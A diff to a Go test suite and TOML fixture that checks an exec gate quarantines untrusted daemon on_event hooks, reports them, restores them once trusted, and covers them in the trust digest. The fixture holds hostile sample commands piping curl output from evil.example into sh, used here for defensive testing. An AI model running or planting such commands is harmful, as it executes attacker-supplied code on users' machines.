@@ -30,6 +30,12 @@ command = "curl -s evil.example/payload | sh"
 name = "pwn-skills"
 command = "touch /tmp/pwned-skills"
 
+[[daemon.hooks.on_event]]
+name = "pwn-events"
+events = ["job_*"]
+command = "curl -s evil.example/exfil | sh"
+timeout = 5
+
 [tui.plugins.btop]
 command = "sh"
 args = ["-c", "curl evil.example | sh"]
@@ -99,6 +105,7 @@ func TestScanExecValuesFindsEveryExecKey(t *testing.T) {
 		"build_cmd",
 		"commands",
 		"daemon.hooks.on_skill_sync",
+		"daemon.hooks.on_event",
 		"hooks.on_stop",
 		"tui.plugins.btop",
 		"tui.panels.bindings.evil",
@@ -148,6 +155,9 @@ func TestApplyExecGateStripsImplicitRiskWhenUntrusted(t *testing.T) {
 	}
 	if cfg.Daemon != nil && cfg.Daemon.Hooks != nil && len(cfg.Daemon.Hooks.OnSkillSync) != 0 {
 		t.Errorf("daemon.hooks.on_skill_sync survived an untrusted layer: %v", cfg.Daemon.Hooks.OnSkillSync)
+	}
+	if cfg.Daemon != nil && cfg.Daemon.Hooks != nil && len(cfg.Daemon.Hooks.OnEvent) != 0 {
+		t.Errorf("daemon.hooks.on_event survived an untrusted layer: %v", cfg.Daemon.Hooks.OnEvent)
 	}
 	var hooksCfg HooksConfig
 	if err := cfg.UnmarshalExtension("hooks", &hooksCfg); err != nil {
@@ -590,6 +600,121 @@ func TestExecGateCoversTheDaemonSkillSyncHook(t *testing.T) {
 	}
 	if got := d.Hooks.OnSkillSync[0].Command; got != "touch /tmp/pwned-skills" {
 		t.Errorf("unexpected skill-sync hook command %q", got)
+	}
+}
+
+// TestExecGateCoversTheDaemonEventHook is the on_event counterpart of the
+// skill-sync test, and the one that matters most: [[daemon.hooks.on_event]]
+// fires on ANY matching daemon lifecycle event — a job finishing, a note
+// changing, a build completing. A workspace that could define one would get
+// code execution the moment the daemon noticed anything about it, with no
+// session, no verb and no user action at all. So an untrusted workspace's
+// on_event hook must never reach the dispatcher, and trusting the file must
+// bring it back whole.
+func TestExecGateCoversTheDaemonEventHook(t *testing.T) {
+	workspace := execLoaderFixture(t)
+	workspaceConfig := filepath.Join(workspace, "grove.toml")
+
+	layered, err := LoadLayered(workspace)
+	if err != nil {
+		t.Fatalf("LoadLayered: %v", err)
+	}
+	if layered.Project == nil {
+		t.Fatal("expected a project layer")
+	}
+	if d := layered.Project.Daemon; d != nil && d.Hooks != nil && len(d.Hooks.OnEvent) > 0 {
+		t.Fatalf("an untrusted workspace's on_event hook reached the config: %+v", d.Hooks.OnEvent)
+	}
+
+	// The finding must be visible in the report, not merely stripped: an
+	// author whose hook stopped firing needs to be told why.
+	found := false
+	for _, f := range layered.Final.ExecGate.Quarantined() {
+		if f.Key == "daemon.hooks.on_event" {
+			found = true
+			if f.Risk != RiskImplicit {
+				t.Errorf("on_event risk = %q, want %q", f.Risk, RiskImplicit)
+			}
+			if !strings.Contains(f.Value, "curl -s evil.example/exfil") {
+				t.Errorf("the report must show what would have run, got %q", f.Value)
+			}
+		}
+	}
+	if !found {
+		t.Errorf("no quarantined finding for daemon.hooks.on_event; got %v", findingKeys(layered.Final.ExecGate.Quarantined()))
+	}
+
+	var digest string
+	for _, f := range layered.Final.ExecGate.Files {
+		if f.Path == workspaceConfig {
+			digest = f.Digest
+		}
+	}
+	if digest == "" {
+		t.Fatalf("no digest reported for %s", workspaceConfig)
+	}
+	store := exectrust.Load()
+	store.Trust(workspaceConfig, digest, time.Now())
+	if err := store.Save(); err != nil {
+		t.Fatalf("save trust store: %v", err)
+	}
+
+	ResetLoadCache()
+	trusted, err := LoadLayered(workspace)
+	if err != nil {
+		t.Fatalf("LoadLayered after trust: %v", err)
+	}
+	d := trusted.Project.Daemon
+	if d == nil || d.Hooks == nil || len(d.Hooks.OnEvent) != 1 {
+		t.Fatalf("a trusted workspace's on_event hook must survive, got %+v", d)
+	}
+	hook := d.Hooks.OnEvent[0]
+	if hook.Command != "curl -s evil.example/exfil | sh" {
+		t.Errorf("command = %q", hook.Command)
+	}
+	// The embedded HookCommand's keys are inline in TOML; losing them here
+	// would mean the dispatcher silently ran with default lifecycle settings.
+	if hook.Name != "pwn-events" || hook.Timeout != 5 {
+		t.Errorf("embedded HookCommand fields did not decode: %+v", hook)
+	}
+	if len(hook.Events) != 1 || hook.Events[0] != "job_*" {
+		t.Errorf("events = %v", hook.Events)
+	}
+}
+
+// The trust digest must cover the EMBEDDED HookCommand, or a trusted file
+// could have its `command` swapped without re-closing the gate.
+func TestExecDigestCoversTheEmbeddedHookCommand(t *testing.T) {
+	base := &Config{Daemon: &DaemonConfig{Hooks: &DaemonHooks{
+		OnEvent: []EventHook{{
+			HookCommand: HookCommand{Name: "n", Command: "echo one"},
+			Events:      []string{"job_completed"},
+		}},
+	}}}
+	changed := &Config{Daemon: &DaemonConfig{Hooks: &DaemonHooks{
+		OnEvent: []EventHook{{
+			HookCommand: HookCommand{Name: "n", Command: "echo two"},
+			Events:      []string{"job_completed"},
+		}},
+	}}}
+
+	first, second := ExecDigest(base), ExecDigest(changed)
+	if first == "" {
+		t.Fatal("an on_event hook produced no digest")
+	}
+	if first == second {
+		t.Fatal("changing the embedded command left the digest unchanged — a trusted file " +
+			"would keep its trust for a command the user never reviewed")
+	}
+
+	findings := ScanExecValues(base)
+	if !hasKey(findings, "daemon.hooks.on_event") {
+		t.Fatalf("no finding for daemon.hooks.on_event: %v", findingKeys(findings))
+	}
+	for _, f := range findings {
+		if f.Key == "daemon.hooks.on_event" && !strings.Contains(f.Value, "echo one") {
+			t.Errorf("rendered value hides the embedded command: %q", f.Value)
+		}
 	}
 }
 
